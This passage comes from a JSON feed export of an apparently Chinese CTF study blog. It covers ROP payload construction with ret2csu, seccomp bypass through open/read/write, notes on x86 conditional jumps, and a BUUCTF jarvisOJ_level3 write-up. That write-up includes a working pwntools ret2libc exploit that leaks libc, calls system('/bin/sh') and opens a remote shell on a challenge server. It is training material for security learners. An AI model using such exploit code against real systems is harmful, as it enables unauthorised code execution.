class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>write_got<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>main_add<span class=\"token punctuation\">)</span> <span class=\"token comment\">#两个必须都是 got 表</span></pre></td></tr></table></figure><p>看到使用 csu 构造 rop，r12 执行的函数必须是在 got 表的地址</p>\n<h3 id=\"26exp输出我们接收的字符\"><a class=\"anchor\" href=\"#26exp输出我们接收的字符\">#</a> 26.exp 输出我们接收的字符</h3>\n<p>利用 <code>log.info(hex() )</code></p>\n<h3 id=\"27prctl-seccomp沙盒机制\"><a class=\"anchor\" href=\"#27prctl-seccomp沙盒机制\">#</a> 27.prctl-seccomp (沙盒机制)</h3>\n<p>利用命令 <code>seccomp-tools dump ./程序名</code> 查看哪些函数被禁用了</p>\n<p>而我们想要绕过需要利用 orw（open/read/write）组合方式读取 flag</p>\n<h3 id=\"28汇编指令jmpjejsjpjojb\"><a class=\"anchor\" href=\"#28汇编指令jmpjejsjpjojb\">#</a> 28. 汇编指令（JMP,JE,JS,JP,JO,JB）</h3>\n<ol>\n<li>\n<p>JMP 无条件跳转</p>\n</li>\n<li>\n<p>JE（JZ）条件跳转</p>\n<p>当 ZF 标致为 1 的时候发生跳转，为 0 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JNE（JNZ）条件跳转</p>\n<p>当 ZF 标致为 0 的时候发生跳转，为 1 的时候不跳转，可以双击标志位，进行判断</p>\n</li>\n<li>\n<p>JS 条件跳转（JNS 相反操作）</p>\n<p>当为整数时，SF 标志位为 0，负数事 SF 标志位为 1，当 SF 为 1 时，JS 发生跳转</p>\n</li>\n<li>\n<p>JP 条件跳转（JNP 反向操作）</p>\n<p>当二进制 1 的个数为偶数时，PF 标志位为 1，当二进制 1 的个数为奇数时，PF 标志位为 0，当 PF 标志位为 1 时，JP 发生跳转</p>\n</li>\n<li>\n<p>JO 条件跳转（JNO 反向操作）</p>\n<p>当结果溢出了，OF 标志位为 1，JO 会发生跳转，当 OF 标志位为 0 时，JO 不发生跳转</p>\n</li>\n<li>\n<p>JB 条件跳转（JNB 反向操作）</p>\n<p>当结果需要借位或者进位的时候，CF 变为 1，当值 1 的时候，JB 发生跳转</p>\n</li>\n<li>\n<p>JBE 跳转</p>\n<p>当 CF 或者 ZF 标志位 1 的时候跳转</p>\n</li>\n<li>\n<p>JG 跳转</p>\n<p>比较结果为大于时跳转（等于也不行）</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTE1NTI2NzU=\">https://zhuanlan.zhihu.com/p/611552675</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/buuctf-pwn/",
            "title": "buuctf.pwn",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<p>#buuctf<br />\n##[HarekazeCTF2019]baby_rop2</p>\n<p>##pwn2_sctf_2016<br />\n<img data-src=\"kerd.png\" alt=\"\" /></p>\n<p>##&lt;center&gt;<strong>31.<strong>jarvisOJ_level3(<strong>ret2libc</strong>)&lt;/center&gt;<br />\n####1. 下载源文后查看文件保护和位数<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjif1.md.png\" alt=\"\" /><br />\n ####2. 发现是 32 位程序，开启了 NX (栈不可执行)<br />\n####，利用 ida 反编译查看程序 C 语言代码<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjPYR.md.png\" alt=\"\" /><br />\n #### 发现有 vul 函数进入查看<br />\n<img data-src=\"https://s1.ax1x.com/2023/09/06/pPsjCk9.png\" alt=\"\" /><br />\n ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 \t注意:write (1, 输出地址，输出字节数)<br />\n 因为没有发现后门函数，所以利用</strong> write 泄露 libc 的地址来执行 system (/bin/sh)</strong><br />\n###exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tp<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28074</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\te<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./level3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\twrite_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tread_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tmain<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpayload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">#p.recvuntil(\"Input:\\n\")</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tread<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tlibc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tlibcbase<span class=\"token operator\">=</span>read<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libcbase<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tpayload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x88</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>#### 此题无法用 libcsearcher 远程库找到 libc</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "ctf"
            ]
        }
    ]
}